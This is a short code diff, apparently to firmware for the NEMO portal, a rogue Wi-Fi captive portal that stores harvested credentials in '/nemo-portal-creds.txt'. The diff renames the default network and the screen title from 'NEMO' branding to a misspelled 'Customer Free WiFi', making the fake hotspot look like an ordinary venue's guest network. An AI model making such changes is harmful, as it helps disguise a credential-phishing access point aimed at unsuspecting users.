@@ -3,7 +3,7 @@
 // Retaining the Portuguese translations since this project has a large
 // fan base in Brazil. Shouts to CyberJulio as well.
 
-#define DEFAULT_AP_SSID_NAME "NEMO Free WiFi"
+#define DEFAULT_AP_SSID_NAME "Custmer Free WiFi"
 #define SD_CREDS_PATH "/nemo-portal-creds.txt"
 
 
@@ -163,7 +163,7 @@ void printHomeToScreen() {
   DISP.setTextSize(MEDIUM_TEXT);
   DISP.setTextColor(BGCOLOR, FGCOLOR);
   DISP.setCursor(0, 0);
-  DISP.println(" NEMO PORTAL ");
+  DISP.println(" Customer Fre WIFI ");
   DISP.setTextSize(SMALL_TEXT);
   DISP.setTextColor(FGCOLOR, BGCOLOR);
   DISP.printf("%s\n\n",apSsidName.c_str());
